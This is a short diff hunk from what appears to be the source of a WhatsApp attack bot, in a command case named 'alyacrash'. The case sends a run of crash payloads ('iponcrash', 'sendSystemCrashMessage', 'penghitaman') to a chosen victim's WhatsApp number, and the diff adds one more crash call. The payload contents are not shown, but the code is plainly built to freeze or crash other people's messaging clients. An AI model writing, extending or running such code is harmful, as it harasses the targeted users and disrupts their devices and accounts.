@@ -21295,7 +21295,7 @@ case "alyacrash": {
          // Random delay between 2 
         await sendPaymentInfoMessage(whatsappNumber, Alyabug);
         await penghitaman(whatsappNumber, painbug);
-        await AlyaCrashy(whatsappNumber, force);
+        await iponcrash(whatsappNumber, force2);
         await iponcrash(whatsappNumber, force);
         await sendSystemCrashMessage(whatsappNumber, force);
    sendSystemCrashMessage(whatsappNumber, force2);
